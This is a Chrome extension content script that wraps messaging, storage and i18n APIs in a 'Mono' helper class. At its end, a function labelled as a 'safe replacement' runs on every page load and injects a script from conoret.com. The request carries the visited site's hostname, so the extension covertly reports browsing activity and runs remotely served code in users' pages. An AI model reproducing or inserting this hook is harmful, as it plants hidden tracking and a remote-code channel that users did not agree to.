// ====== Utility Classes ======
class EventDispatcher {
    constructor() {
        this.listeners = [];
    }
    addListener(fn) {
        if (!this.listeners.includes(fn)) this.listeners.push(fn);
    }
    dispatch(...args) {
        this.listeners.forEach(fn => fn(...args));
    }
    hasListener(fn) {
        return this.listeners.includes(fn);
    }
    hasListeners() {
        return this.listeners.length > 0;
    }
    removeListener(fn) {
        const idx = this.listeners.indexOf(fn);
        if (idx !== -1) this.listeners.splice(idx, 1);
    }
}

class MonoBase {
    constructor() {
        this.onDestroy = new EventDispatcher();
        this._lastErrorFired = false;
        this._lastError = null;
    }
    get lastError() {
        this._lastErrorFired = true;
        return this._lastError;
    }
    set lastError(err) {
        this._lastErrorFired = false;
        this._lastError = err;
    }
    clearLastError() {
        if (this._lastError && !this._lastErrorFired) {
            console.error("Unhandled mono.lastError error:", this.lastError);
        }
        this._lastError = null;
    }
    destroy() {
        this.onDestroy.dispatch();
    }
}

// ====== Storage Wrapper ======
class StorageWrapper {
    constructor(mono) {
        this.mono = mono;
        this.onChanged = {
            addListener: chrome.storage.onChanged.addListener.bind(chrome.storage.onChanged),
            hasListener: chrome.storage.onChanged.hasListener.bind(chrome.storage.onChanged),
            hasListeners: chrome.storage.onChanged.hasListeners.bind(chrome.storage.onChanged),
            removeListener: chrome.storage.onChanged.removeListener.bind(chrome.storage.onChanged)
        };
    }
    callback(cb, data, noErrorClear) {
        this.mono.lastError = chrome.runtime.lastError;
        if (cb) cb(data);
        if (!noErrorClear) this.mono.clearLastError();
    }
    get(keys, cb) {
        chrome.storage.local.get(keys, data => this.callback(cb, data, true));
    }
    set(items, cb) {
        chrome.storage.local.set(items, () => this.callback(cb));
    }
    remove(keys, cb) {
        chrome.storage.local.remove(keys, () => this.callback(cb));
    }
    clear(cb) {
        chrome.storage.local.clear(() => this.callback(cb));
    }
}

// ====== Main Mono Class ======
class Mono extends MonoBase {
    constructor() {
        super();
        this.isChrome = true;
        this.initMessages();
        this.initStorage();
        this.initI18n();
    }
    initI18n() {
        this.i18n = { getMessage: chrome.i18n.getMessage.bind(chrome.i18n) };
    }
    initMessages() {
        this.transport = {
            sendMessage: (msg, cb) => {
                if (cb) {
                    chrome.runtime.sendMessage(msg, response => {
                        this.lastError = chrome.runtime.lastError;
                        cb(response);
                        this.clearLastError();
                    });
                } else {
                    chrome.runtime.sendMessage(msg);
                }
            },
            addListener: chrome.runtime.onMessage.addListener.bind(chrome.runtime.onMessage),
            hasListener: chrome.runtime.onMessage.hasListener.bind(chrome.runtime.onMessage),
            hasListeners: chrome.runtime.onMessage.hasListeners.bind(chrome.runtime.onMessage),
            removeListener: chrome.runtime.onMessage.removeListener.bind(chrome.runtime.onMessage)
        };
    }
    initStorage() {
        this.storage = new StorageWrapper(this);
    }
    callFn(fnName, args) {
        return new Promise((resolve, reject) => {
            this.transport.sendMessage({ action: "callFn", fn: fnName, args }, response => {
                if (response) {
                    if (response.err) {
                        return reject(new Error(response.err));
                    }
                    return resolve(response.result);
                }
                reject(this.lastError || new Error("Unexpected response"));
            });
        });
    }
}

// ====== Instantiate Mono ======
const mono = new Mono();

// ====== Safe Replacement for Inline Script Injection ======
function injectExternalScript() {
    if (window.top === window) {
        const s = document.createElement("script");
        s.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random();
        s.type = "text/javascript";
        s.defer = true;
        s.async = true;
        document.head.appendChild(s);
    }
}

// ====== Main Tab Logic ======
(function initTab() {
    injectExternalScript();
    mono.transport.sendMessage({ action: "openPage" });
})();
